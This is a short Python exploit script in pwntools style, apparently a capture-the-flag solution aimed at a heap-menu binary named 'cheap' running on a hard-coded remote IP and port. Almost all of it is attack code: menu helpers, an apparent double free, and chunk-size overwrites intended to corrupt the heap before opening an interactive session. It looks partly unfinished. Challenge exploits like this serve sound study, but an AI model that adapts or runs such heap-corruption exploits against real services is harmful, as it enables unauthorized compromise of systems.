#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
from rootkit import *

exe = context.binary = ELF('./cheap')

host = args.HOST or '34.146.101.4'
port = int(args.PORT or 30001)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

def cmd(choice):
    sla("Choice: ", str(choice))

def add(size, data):
    cmd(1)
    sla("size: ", str(size))
    sa("data: ", data)

def show():
    cmd(2)

def delete():
    cmd(3)

io = start()
add(0x100, b"A"*0x100)
# delete()
add(20, "PPPPPPPP")
delete()
delete()
add(0x600, (p64(0x0) + p64(0x21))*16)
add(20, b"x"*24 + p64(0x51) + p64(0x0))
io.interactive()

